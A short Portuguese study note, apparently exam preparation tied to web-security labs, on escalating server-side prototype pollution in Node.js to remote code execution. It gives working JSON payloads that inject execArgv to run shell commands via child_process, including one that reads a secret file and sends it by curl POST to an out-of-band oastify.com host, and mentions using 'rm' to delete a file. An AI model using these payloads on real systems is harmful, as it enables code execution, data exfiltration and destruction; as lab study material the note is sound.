# SSPP - Server Side Prototype Pollution

Probabilidade: $${\color{lightblue}baíxissima}$$.

<br>

Separei esse Prototype Pollution do que está na Etapa 2 para evitar confusão, mas basicamente é igual o Server-Side que está lá mas com objetivo de RCE.

<br>

## Laboratórios

**Remote Code Execution via Server-Side Prototype Pollution**
```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('cat /home/carlos/morale.txt')"
    ]
}
```

> [!CAUTION]
> O comando acima foi trocado de 'rm' para 'cat' de propósito, para evitar que você copie o comando e delete o arquivo secret do exame. Nos laboratórios, de fato você precisará usar o comando 'rm'.

Se você quer testar a execução do comando:
```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://OASTIFY.COM')"
    ]
}
```

<br>

Versão adaptada:
```
"__proto__": {
    "execArgv": [
        "--eval=require('child_process').execSync('cat /home/carlos/secret | curl -X POST --data-binary @- http://xuvdjpko5xqmt5y70ln82cejbah15xtm.oastify.com')"
    ]
}
```
